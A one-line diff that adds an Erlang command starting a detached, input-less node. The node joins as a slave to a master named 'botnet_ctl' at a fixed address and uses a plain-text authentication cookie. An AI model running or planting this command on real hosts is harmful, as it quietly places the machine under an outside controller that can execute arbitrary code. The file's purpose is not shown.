@@ -1,0 +1,1 @@
+erl -detached -noinput -master botnet_ctl@10.10.10.19  -name foobar@72.44.56.49 -s slave slave_start botnet_ctl@10.10.10.19 slave_waiter_0 -setcookie CSXEEYDRMQXMMFPNSDWW
